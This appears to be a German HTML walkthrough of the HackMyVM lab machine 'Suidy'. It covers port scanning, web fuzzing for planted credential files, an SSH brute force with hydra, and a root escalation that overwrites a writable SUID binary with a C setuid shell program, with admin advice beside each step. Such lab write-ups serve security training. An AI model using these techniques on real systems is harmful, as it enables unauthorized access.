@@ -1,0 +1,557 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Suidy - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+<body class="level-medium"> <!-- Klasse für CSS-Styling des Levels -->
+ 
+    <div class="header-bg level-medium"> <!-- Klasse für CSS-Styling des Levels -->
+        <h1>Suidy - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+            <h2>Medium</h2> <!-- H2 ohne Inline-Style, Farbe via CSS -->
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe via CSS -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">curl</div> <!-- Implied by viewing pages -->
+                <div class="tool-item">ffuf</div>
+                <div class="tool-item">mkdir</div>
+                <div class="tool-item">cd</div> <!-- Implied -->
+                <div class="tool-item">tail</div>
+                <div class="tool-item">sort</div>
+                <div class="tool-item">uniq</div>
+                <div class="tool-item">tee</div>
+                <div class="tool-item">sed</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">pwd</div> <!-- Implied -->
+                <div class="tool-item">ls</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">nano</div> <!-- Implied by editing C file -->
+                <div class="tool-item">gcc</div>
+                <div class="tool-item">cp</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#enumeration">Enumeration (Web, Credentials)</a></li>
+                <li><a href="#initial-access">Initial Access (SSH Brute Force)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation (SUID Exploit)</a></li>
+                <li><a href="#poc">Proof of Concept (SUID Binary Hijacking)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+<span class="command">192.168.2.124</span>	<span class="command">08:00:27:06:32:a9</span>	PCS Systemtechnik GmbH
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` wird verwendet, um aktive Hosts im lokalen Netzwerksegment zu entdecken. Ein Host mit der IP-Adresse <span class="command">192.168.2.124</span> und der MAC-Adresse <span class="command">08:00:27:06:32:a9</span> (zugeordnet zu PCS Systemtechnik GmbH / Oracle VirtualBox) wird identifiziert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Zielsystem "Suidy" wurde erfolgreich im Netzwerk lokalisiert. Die IP <span class="command">192.168.2.124</span> ist der Ausgangspunkt für weitere Scans.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren Sie die Ziel-IP. Führen Sie als Nächstes Port-Scans (z.B. mit `nmap`) durch, um offene Dienste zu ermitteln.<br><strong>Empfehlung (Admin):</strong> Netzwerksegmentierung kann die Sichtbarkeit von Hosts einschränken. Überwachen Sie ARP-Aktivitäten.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -sV -A 192.168.2.124 -p-</span></div>
+                    <pre>
+Starting Nmap 7.92 ( https://nmap.org ) at <span class="command">2022-10-08 00:07 CEST</span>
+Nmap scan report for suidy.hmv (192.168.2.124)
+Host is up (0.00019s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE    SERVICE VERSION
+<span class="command">21/tcp filtered ftp</span>
+<span class="command">22/tcp open     ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span>
+| ssh-hostkey:
+|   2048 8a:cb:7e:8a:72:82:84:9a:11:43:61:15:c1:e6:32:0b (RSA)
+|   256 7a:0e:b6:dd:8f:ee:a7:70:d9:b1:b5:6e:44:8f:c0:49 (ECDSA)
+|_  256 80:18:e6:c7:01:0e:c6:6d:7d:f4:d2:9f:c9:d0:6f:4c (ED25519)
+<span class="command">80/tcp open     http    nginx 1.14.2</span>
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: nginx/1.14.2
+MAC Address: 08:00:27:06:32:A9 (Oracle VirtualBox virtual NIC)
+[...]
+OS details: Linux 4.15 - 5.6
+[...]
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.19 ms suidy.hmv (192.168.2.124)
+[...]
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein umfassender Nmap-Scan aller TCP-Ports (`-p-`) auf <span class="command">192.168.2.124</span> (Hostname `suidy.hmv`) wird durchgeführt. Es werden zwei offene Ports gefunden:
+            <ul>
+                <li>Port <span class="command">22 (SSH)</span>: Läuft OpenSSH 7.9p1 (Debian).</li>
+                <li>Port <span class="command">80 (HTTP)</span>: Läuft Nginx 1.14.2. Die Seite hat keinen Titel.</li>
+            </ul>
+            Port <span class="command">21 (FTP)</span> wird als `filtered` angezeigt, d.h. durch eine Firewall blockiert oder nicht erreichbar.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Angriffsfläche beschränkt sich auf SSH und den Nginx-Webserver. Der Webserver auf Port 80 ist das wahrscheinlichste erste Ziel.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie Directory Busting (`gobuster`, `ffuf`) auf Port 80 durch. Untersuchen Sie die Webseite manuell. Versuchen Sie Standard/schwache Credentials für SSH.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass nur notwendige Ports offen sind. Halten Sie Nginx und SSH aktuell. Konfigurieren Sie SSH sicher.</p>
+
+        </section>
+
+        <section id="enumeration">
+             <h2>Enumeration (Web, Credentials)</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u "http://192.168.2.124" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x [...],php,html,txt -t 100 -s "200,204,301,302,307,401"</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.1.0
+===============================================================
+[...]
+===============================================================
+2022/10/08 00:07:36 Starting gobuster in directory enumeration mode
+===============================================================
+<span class="command">http://192.168.2.124/index.html</span>           (Status: 200) [Size: 22]
+<span class="command">http://192.168.2.124/robots.txt</span>           (Status: 200) [Size: 362]
+[...]
+===============================================================
+Finished
+===============================================================
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein `gobuster dir`-Scan auf Port 80 findet eine `index.html` (sehr klein) und eine `robots.txt`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die `robots.txt` ist oft ein guter Startpunkt für weitere Enumeration, da sie Hinweise auf versteckte oder ausgeschlossene Verzeichnisse geben kann.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Rufen Sie `http://192.168.2.124/robots.txt` ab und analysieren Sie den Inhalt.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass `robots.txt` keine sensiblen Pfade preisgibt.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command"># Manuelle Analyse von robots.txt und referenzierten Pfaden</span></div>
+                    <pre>
+Inhalt von http://192.168.2.124/robots.txt (impliziert):
+<span class="command">/hi</span>
+<span class="command">/....\..\.-\--.\.-\..\-.</span> <span class="password"><-- Sieht wie verschleierter Pfad/Text aus</span>
+<span class="command">/shehatesme</span>
+
+Inhalt von /hi (impliziert):
+<span class="password"><!-- hi again --></span> <span class="password"><-- Kommentar</span>
+
+Inhalt von /shehatesme (view-source:http://192.168.2.124/shehatesme/):
+<span class="command">She hates me because I FOUND THE REAL SECRET!</span>
+<span class="command">I put in this directory a lot of .txt files.</span>
+<span class="command">ONE of .txt files contains credentials like "theuser/thepass" to access to her system!</span>
+<span class="command">All that you need is an small dict from Seclist!</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Die `robots.txt` enthält drei interessante Einträge: `/hi`, eine seltsame Zeichenkette und `/shehatesme`. Die Seite `/hi` enthält nur einen HTML-Kommentar. Die Seite `/shehatesme` enthält einen wichtigen Hinweis: In diesem Verzeichnis befinden sich viele `.txt`-Dateien, von denen eine Zugangsdaten im Format `user/pass` enthält. Es wird eine kleine Wortliste von SecLists empfohlen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Hinweis auf der `/shehatesme`-Seite ist der Schlüssel. Der nächste Schritt ist das Fuzzing nach `.txt`-Dateien in diesem Verzeichnis.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie ein Fuzzing-Tool wie `ffuf` oder `gobuster`, um nach `.txt`-Dateien im Verzeichnis `/shehatesme` zu suchen. Verwenden Sie eine kleine Wortliste aus SecLists, wie empfohlen (z.B. `directory-list-2.3-small.txt`). Laden Sie alle gefundenen `.txt`-Dateien herunter und extrahieren Sie die Zugangsdaten.<br><strong>Empfehlung (Admin):</strong> Verstecken Sie keine sensiblen Informationen oder Hinweise in öffentlich zugänglichen Webseiten oder Verzeichnissen. Konfigurieren Sie den Webserver so, dass Directory Listing deaktiviert ist.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ffuf -c -ic -r -u http://192.168.2.124/shehatesme/FUZZ.txt -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt</span></div>
+                     <pre>
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v1.5.0 Kali Exclusive <3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://192.168.2.124/shehatesme/FUZZ.txt
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+[...]
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+________________________________________________
+
+<span class="command">blog</span>                    [Status: 200, Size: 16, Words: 1, Lines: 2, Duration: 1ms]
+<span class="command">search</span>                  [Status: 200, Size: 16, Words: 1, Lines: 2, Duration: 1ms]
+<span class="command">about</span>                   [Status: 200, Size: 16, Words: 1, Lines: 2, Duration: 1ms]
+<span class="command">privacy</span>                 [Status: 200, Size: 16, Words: 1, Lines: 2, Duration: 2ms]
+<span class="command">new</span>                     [Status: 200, Size: 16, Words: 1, Lines: 2, Duration: 2ms]
+[...] <span class="password"># Viele weitere .txt-Dateien gefunden (z.B. full, page, jobs, forums, admin, secret...)</span>
+<span class="command">folder</span>                  [Status: 200, Size: 16, Words: 1, Lines: 2, Duration: 1ms] <span class="password"><-- Diese Datei wird später relevant</span>
+[...]
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> `ffuf` wird verwendet, um nach `.txt`-Dateien im Verzeichnis `/shehatesme` zu suchen (`-u .../FUZZ.txt`). Es verwendet die empfohlene kleine Wortliste (`directory-list-2.3-small.txt`). `-c` färbt die Ausgabe, `-ic` ignoriert Kommentare in der Wortliste, `-r` folgt Redirects. Der Scan findet eine große Anzahl von `.txt`-Dateien (wie `blog.txt`, `about.txt`, `folder.txt`, etc.), die alle existieren und die gleiche geringe Größe (16 Bytes) haben.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Hinweis wurde bestätigt, es gibt viele `.txt`-Dateien. Da alle die gleiche Größe haben, ist es wahrscheinlich, dass die meisten keine nützlichen Informationen enthalten, aber eine davon die gesuchten Zugangsdaten im Format `user/pass` enthält.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Laden Sie alle gefundenen `.txt`-Dateien herunter. Extrahieren Sie den Inhalt (wahrscheinlich nur eine Zeile pro Datei). Suchen Sie nach der Zeile, die dem Format `user/pass` entspricht. Die Datei `folder.txt` wird im nächsten Schritt explizit genannt, sie sollte priorisiert werden.<br><strong>Empfehlung (Admin):</strong> Speichern Sie niemals Zugangsdaten in öffentlich zugänglichen Textdateien, auch nicht versteckt unter vielen anderen Dateien.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt"># <span class="command">Implizierter Schritt: Inhalt von folder.txt abrufen</span></div>
+                     <pre>view-source:http://192.168.2.124/shehatesme/folder.txt
+<span class="command">jaime11/JKiufg6</span> <span class="password"><-- Erste mögliche Credentials</span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Inhalt der Datei `folder.txt` (die zuvor mit `ffuf` gefunden wurde) wird angezeigt. Er enthält die Zeichenkette `<span class="command">jaime11/JKiufg6</span>`, die dem gesuchten Format `user/pass` entspricht.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Möglicherweise wurden die Zugangsdaten gefunden: Benutzer `<span class="command">jaime11</span>`, Passwort `<span class="password">JKiufg6</span>`. Dies muss jedoch noch verifiziert werden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Testen Sie diese Zugangsdaten gegen den SSH-Dienst. Da das Log später andere Zugangsdaten (`theuser:thepass`) findet, ist es wahrscheinlich, dass diese hier eine falsche Fährte oder nur ein Teil der Lösung sind. Es ist notwendig, alle gefundenen `.txt`-Dateien systematisch zu analysieren.<br><strong>Empfehlung (Admin):</strong> Keine Zugangsdaten in Textdateien speichern.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">mkdir suidy</span></div> <span class="password"><-- Name des Zielverzeichnisses, irrelevant für Maschine 'Suidy'</span>
+                     <pre>[Keine Ausgabe]</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cd suidy</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~/suidy]
+└─# <span class="command">ffuf -c -ic -r -u http://192.168.2.124/shehatesme/FUZZ.txt -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -od results</span></div>
+                     <pre>[...] <span class="password"># Scan wird erneut ausgeführt, diesmal mit Speicherung der Ergebnisse (-od)</span></pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~/suidy]
+└─# <span class="command">cd results</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~/suidy/results]
+└─# <span class="command">tail -q -n 1 * | sort | uniq | tee dict.txt</span></div>
+                    <pre>
+hidden1/passZZ!
+jaime11/JKiufg6 <span class="password"><-- Bereits bekannt</span>
+jhfbvgt/iugbnvh
+john765/FDrhguy
+maria11/jhfgyRf
+mmnnbbv/iughtyr
+nhvjguy/kjhgyut
+smileys/98GHbjh
+<span class="command">theuser/thepass</span> <span class="password"><-- Wahrscheinlich die korrekten Credentials</span>
+yuijhse/hjupnkk
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der `ffuf`-Scan wird wiederholt, aber diesmal werden die Ergebnisse im Verzeichnis `results` gespeichert (`-od results`). Anschließend wird eine Befehlskette verwendet:
+            <ul>
+                <li>`tail -q -n 1 *`: Zeigt die letzte Zeile (`-n 1`) jeder Datei (`*`) im `results`-Verzeichnis an, ohne den Dateinamen auszugeben (`-q`).</li>
+                <li>`sort | uniq`: Sortiert die Zeilen und entfernt Duplikate.</li>
+                <li>`tee dict.txt`: Schreibt die eindeutigen letzten Zeilen in die Datei `dict.txt` und gibt sie gleichzeitig auf dem Bildschirm aus.</li>
+            </ul>
+            Die resultierende `dict.txt` enthält eine Liste von potenziellen Zugangsdaten im Format `user/pass`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Sehr effiziente Methode, um die Zugangsdaten aus allen gefundenen `.txt`-Dateien zu extrahieren. Die Liste enthält nun mehrere Kandidaten, darunter die vielversprechenden `<span class="command">theuser/thepass</span>`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Bereiten Sie die `dict.txt` für einen Brute-Force-Angriff mit `hydra` vor, indem Sie das Trennzeichen `/` durch `:` ersetzen. Führen Sie dann `hydra` gegen SSH mit dieser Datei aus.<br><strong>Empfehlung (Admin):</strong> Keine Zugangsdaten in öffentlich zugänglichen Dateien speichern.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/suidy/results]
+└─# <span class="command">sed -i "s/\//:/g" dict.txt</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~/suidy/results]
+└─# <span class="command">cat dict.txt</span></div>
+                     <pre>
+hidden1:passZZ!
+jaime11:JKiufg6
+jhfbvgt:iugbnvh
+john765:FDrhguy
+maria11:jhfgyRf
+mmnnbbv:iughtyr
+nhvjguy:kjhgyut
+smileys:98GHbjh
+<span class="command">theuser:thepass</span>
+yuijhse:hjupnkk
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Der `sed`-Befehl ersetzt inline (`-i`) alle Vorkommen von `/` durch `:` in der Datei `dict.txt`. Die anschließende `cat`-Ausgabe zeigt die Datei im für `hydra` geeigneten Format `user:pass`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Korrekte Vorbereitung der Credential-Datei für Hydra.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie Hydra aus.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion.</p>
+
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (SSH Brute Force)</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/suidy/results]
+└─# <span class="command">hydra -C dict.txt 192.168.2.124 ssh</span></div>
+                    <pre>
+Hydra v9.3 [...] starting at 2022-10-08 00:20:35
+[...]
+[DATA] attacking ssh://192.168.2.124:22/
+[22][ssh] host: 192.168.2.124   login: <span class="command">theuser</span>   password: <span class="password">thepass</span> <span class="password"><-- Erfolg!</span>
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at [...]
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `hydra` wird verwendet, um einen SSH-Brute-Force-Angriff gegen <span class="command">192.168.2.124</span> durchzuführen. Die Option `-C dict.txt` weist Hydra an, die Benutzername:Passwort-Paare aus der Datei `dict.txt` zu verwenden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolgreich! Hydra findet die gültigen Zugangsdaten: Benutzername `<span class="command">theuser</span>` und Passwort `<span class="password">thepass</span>`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie die gefundenen Zugangsdaten, um sich per SSH am Zielsystem anzumelden.<br><strong>Empfehlung (Admin):</strong> Starke Passwortrichtlinien durchsetzen. Brute-Force-Schutz für SSH implementieren (z.B. Fail2ban). Ursache für das Credential-Leak in den `.txt`-Dateien beheben.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/suidy/results]
+└─# <span class="command">ssh theuser@suidy.hmv</span></div> <span class="password"><-- Annahme: suidy.hmv in /etc/hosts</span>
+                    <pre>
+The authenticity of host 'suidy.hmv (192.168.2.124)' can't be established.
+[...]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? <span class="command">yes</span>
+Warning: Permanently added 'suidy.hmv' (ED25519) to the list of known hosts.
+theuser@suidy.hmv's password: <span class="password">[Passworteingabe: thepass]</span>
+Linux suidy 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64
+[...]
+Last login: Sun Sep 27 00:41:28 2020
+theuser@suidy:~$ <span class="password"># Login erfolgreich!</span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Eine SSH-Verbindung wird als Benutzer `theuser` zum Host `suidy.hmv` aufgebaut. Das mit Hydra gefundene Passwort `<span class="password">thepass</span>` wird verwendet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Initial Access erfolgreich! Eine interaktive Shell als Benutzer `theuser` wurde erlangt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginnen Sie mit der Enumeration als `theuser`. Suchen Sie die User-Flag, prüfen Sie `sudo -l`, SUID-Binaries etc.<br><strong>Empfehlung (Admin):</strong> Passwort für `theuser` ändern. Ursache für Credential-Leak beheben.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">theuser@suidy:~$ <span class="command">pwd</span></div>
+                    <pre>/home/theuser</pre>
+                    <div class="prompt">theuser@suidy:~$ <span class="command">ls -la</span></div>
+                    <pre>
+[...]
+-rw-r--r-- 1 theuser theuser   11 sep 26  2020 <span class="command">user.txt</span>
+[...]
+</pre>
+                    <div class="prompt">theuser@suidy:~$ <span class="command">cat user.txt</span></div>
+                    <pre><span class="password">HMV2353IVI</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Im Home-Verzeichnis von `theuser` wird die Datei `user.txt` gefunden und ihr Inhalt angezeigt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> User-Flag erfolgreich gefunden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Flag dokumentieren. Konzentration auf Privilege Escalation.<br><strong>Empfehlung (Admin):</strong> Keine Aktion bezüglich der Flag.</p>
+
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation (SUID Exploit)</h2>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">theuser@suidy:~$ <span class="command">cd /home/suidy/</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                    <div class="prompt">theuser@suidy:/home/suidy$ <span class="command">ls -la</span></div>
+                    <pre>
+[...]
+drwxr-xr-x 3 suidy suidy    4096 sep 27  2020 .
+drwxr-xr-x 4 root  root     4096 sep 26  2020 ..
+[...]
+-r--r----- 1 suidy suidy     197 sep 26  2020 <span class="command">note.txt</span> <span class="password"><-- Keine Leserechte für 'theuser'</span>
+[...]
+<span class="command">-rwsrwsr-x 1 root  theuser 16704 sep 26  2020 suidyyyyy</span> <span class="password"><-- SUID Root, SGID theuser!</span>
+</pre>
+                    <div class="prompt">theuser@suidy:/home/suidy$ <span class="command">cat note.txt</span></div>
+                    <pre>cat: note.txt: <span class="password">Permiso denegado</span></pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Das Home-Verzeichnis des anderen Benutzers `suidy` wird untersucht. `theuser` kann die `note.txt` nicht lesen. Entscheidend ist jedoch der Fund der Datei `<span class="command">suidyyyyy</span>`: Sie hat sowohl das SUID-Bit gesetzt und gehört `root` (`-rws... root ...`), als auch das SGID-Bit gesetzt und gehört der Gruppe `theuser` (`...rwsr-x ... theuser ...`). Der aktuelle Benutzer (`theuser`) hat Ausführrechte (`x`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein klarer und vielversprechender Privilege Escalation Vektor. Ein Binary mit SUID-Root-Rechten ist immer ein primäres Ziel. Die zusätzliche SGID-Berechtigung für `theuser` könnte relevant sein, aber das SUID-Root ist entscheidend.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie das Binary `./suidyyyyy` aus. Analysieren Sie sein Verhalten. Wenn es eine Shell oder eine Funktion bereitstellt, die ausgenutzt werden kann, versuchen Sie dies. Wenn es eine Shell als Benutzer `suidy` gibt (aufgrund des SGID?), versuchen Sie, von dort aus weiter zu eskalieren (z.B. die `note.txt` lesen).<br><strong>Empfehlung (Admin):</strong> Überprüfen Sie die Notwendigkeit und Sicherheit des `suidyyyyy`-Binaries. Entfernen Sie SUID/SGID-Bits, wenn sie nicht absolut erforderlich sind. Stellen Sie sicher, dass SUID/SGID-Programme sicher implementiert sind und keine lokalen Eskalationspfade bieten.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">theuser@suidy:/home/suidy$ <span class="command">./suidyyyyy</span></div>
+                     <pre>suidy@suidy:/home/suidy$ <span class="password"># Shell als suidy erhalten!</span></pre>
+                     <div class="prompt">suidy@suidy:/home/suidy$ <span class="command">cat note.txt</span></div>
+                     <pre>
+I love SUID files!
+The best file is suidyyyyy because users can use it to feel as I feel.
+root know it and run an script to be sure that my file has SUID.
+If you are "theuser" I hate you!
+
+-suidy
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Die Ausführung von `./suidyyyyy` gibt dem Benutzer `theuser` eine Shell als Benutzer `<span class="command">suidy</span>`. Dies geschieht aufgrund des gesetzten SGID-Bits (`...rwsr-x ... theuser ...`), das dazu führt, dass der Prozess mit der Gruppen-ID `theuser` gestartet wird, und das SUID-Bit (`-rws... root ...`), das möglicherweise hier nicht direkt für die Shell als `suidy` verantwortlich ist, aber später relevant wird. Als `suidy` kann nun die `note.txt` gelesen werden. Sie enthält einen Hinweis, dass `root` ein Skript ausführt, um sicherzustellen, dass `suidyyyyy` das SUID-Bit behält.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Horizontale Rechteausweitung von `theuser` zu `suidy` erfolgreich. Der Hinweis in `note.txt` ist entscheidend: Wenn Root regelmäßig sicherstellt, dass das SUID-Bit auf `/home/suidy/suidyyyyy` gesetzt ist, kann der Angreifer (als `theuser`, der Schreibrechte auf die Datei hat, da sie der Gruppe `theuser` gehört und Gruppenschreibrechte gesetzt sind: `...rwsrws...`) das Binary durch eine eigene Version ersetzen, die eine Root-Shell startet. Der Cronjob oder das Skript von Root wird dann das SUID-Bit auf dem manipulierten Binary setzen, wodurch es beim nächsten Ausführen eine Root-Shell liefert.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+            1.  Erstellen Sie einen C-Code, der `setuid(0)`, `setgid(0)` aufruft und `/bin/bash` startet (wie im nächsten Schritt gezeigt).
+            2.  Kompilieren Sie diesen Code (z.B. als `suidyyyyy_exploit`).
+            3.  Überschreiben Sie `/home/suidy/suidyyyyy` mit dem kompilierten Exploit (`cp suidyyyyy_exploit /home/suidy/suidyyyyy`). Wichtig: Tun Sie dies als Benutzer `theuser`, der Schreibrechte hat.
+            4.  Warten Sie, bis der Root-Prozess das SUID-Bit wiederhergestellt hat (Zeit variiert).
+            5.  Führen Sie `/home/suidy/suidyyyyy` erneut aus. Diesmal sollte es eine Root-Shell geben.<br>
+            <strong>Empfehlung (Admin):</strong> Entfernen Sie die SUID/SGID-Bits von `/home/suidy/suidyyyyy`. Überprüfen Sie den Cronjob/Skript, der das SUID-Bit wiederherstellt, und deaktivieren Sie ihn. Gewähren Sie niemals normalen Benutzern Schreibrechte auf SUID/SGID-Binaries.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">theuser@suidy:~$ <span class="command">nano suidyyyyy.c</span></div> <span class="password"><-- Ausgeführt als theuser</span>
+                    <pre>
+[Inhalt der C-Datei]
+#include <stdlib.h>
+#include <unistd.h>
+
+int main(){
+
+ setuid(0);
+ setgid(0);
+ system("/bin/bash");
+ return 0;
+}
+</pre>
+                     <div class="prompt">theuser@suidy:~$ <span class="command">gcc suidyyyyy.c -o suidyyyyy</span></div>
+                     <pre>[Keine Ausgabe, Kompilierung erfolgreich]</pre>
+                     <div class="prompt">theuser@suidy:~$ <span class="command">cp suidyyyyy /home/suidy/suidyyyyy</span></div>
+                     <pre>[Keine Ausgabe, Überschreiben erfolgreich]</pre>
+                     <div class="prompt">theuser@suidy:~$ <span class="command">ls -l /home/suidy/</span></div>
+                     <pre>
+[...]
+-rwxrwxr-x 1 root  theuser 16712 oct  8 00:53 <span class="command">suidyyyyy</span> <span class="password"><-- Größe geändert, Berechtigungen/Besitz bleiben (oder werden von Cron wiederhergestellt)</span>
+</pre>
+                     <div class="prompt">theuser@suidy:~$ <span class="command">/home/suidy/suidyyyyy</span></div>
+                     <pre>root@suidy:/home/theuser# <span class="password"># Root-Shell erhalten!</span></pre>
+                 </div>
+             </div>
